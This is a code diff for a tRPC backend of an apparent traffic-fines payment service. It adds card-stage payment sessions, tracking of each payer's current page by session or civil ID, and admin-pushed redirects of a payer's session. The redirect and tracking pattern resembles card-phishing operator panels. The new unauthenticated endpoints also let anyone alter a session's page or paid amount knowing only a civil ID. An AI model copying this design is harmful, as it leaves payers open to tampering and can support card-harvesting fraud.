@@ -259,18 +259,35 @@ export const appRouter = router({
         const clientIp = (ctx.req.headers["x-forwarded-for"] as string)?.split(",")[0] || ctx.req.socket.remoteAddress || "";
         const userAgent = ctx.req.headers["user-agent"] || "";
 
-        await createPaymentSession({
-          sessionId,
-          queryId: input.queryId ?? null,
-          selectedFines: input.selectedFines,
-          totalAmount: input.totalAmount,
-          civilId: input.civilId ?? null,
-          enquiryType: input.enquiryType ?? '1',
-          stage: "card",
-          clientIp,
-          userAgent,
-          statusRead: 0,
-        });
+          // Calculate total fines amount from the original query
+          let totalFinesAmount: string | null = null;
+          let totalFinesCount: number = 0;
+          if (input.queryId) {
+            try {
+              const relatedQuery = await getFineQueryById(input.queryId);
+              if (relatedQuery) {
+                totalFinesAmount = relatedQuery.totalAmount?.toString() || null;
+                totalFinesCount = relatedQuery.totalFines || 0;
+              }
+            } catch (err) {
+              console.error("[Payment] Failed to get related query data:", err);
+            }
+          }
+
+          await createPaymentSession({
+            sessionId,
+            queryId: input.queryId ?? null,
+            selectedFines: input.selectedFines,
+            totalAmount: input.totalAmount,
+            civilId: input.civilId ?? null,
+            enquiryType: input.enquiryType ?? '1',
+            stage: "card",
+            clientIp,
+            userAgent,
+            statusRead: 0,
+            totalFinesAmount,
+            totalFinesCount,
+          } as any);
 
         return { success: true, sessionId };
       }),
@@ -531,6 +548,59 @@ export const appRouter = router({
           redirectUrl: input.redirectUrl,
         });
 
+        return { success: true };
+      }),
+
+    // تتبع الصفحة الحالية للعميل
+    trackPage: publicProcedure
+      .input(z.object({
+        sessionId: z.string(),
+        currentPage: z.string(),
+        paidAmount: z.string().optional(),
+      }))
+      .mutation(async ({ input }) => {
+        const updateData: any = { currentPage: input.currentPage };
+        if (input.paidAmount) {
+          updateData.paidAmount = input.paidAmount;
+        }
+        await updatePaymentSession(input.sessionId, updateData);
+        return { success: true };
+      }),
+
+    // تتبع الصفحة الحالية للعميل بالرقم المدني (بدون الحاجة لـ sessionId)
+    updatePageByCivilId: publicProcedure
+      .input(z.object({
+        civilId: z.string(),
+        currentPage: z.string(),
+        amount: z.number().optional(),
+      }))
+      .mutation(async ({ input }) => {
+        const { getPaymentSessionByCivilId } = await import("./db");
+        const session = await getPaymentSessionByCivilId(input.civilId);
+        if (session) {
+          const updateData: any = { currentPage: input.currentPage };
+          if (input.amount) {
+            updateData.paidAmount = input.amount.toString();
+          }
+          await updatePaymentSession(session.sessionId, updateData);
+        }
+        return { success: true };
+      }),
+
+    // إعادة توجيه العميل لصفحة معينة
+    sendRedirect: publicProcedure
+      .input(z.object({
+        token: z.string(),
+        sessionId: z.string(),
+        targetPage: z.string(),
+      }))
+      .mutation(async ({ input }) => {
+        if (!verifyAdminToken(input.token)) {
+          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
+        }
+        await updatePaymentSession(input.sessionId, {
+          redirectUrl: input.targetPage,
+        });
         return { success: true };
       }),
 
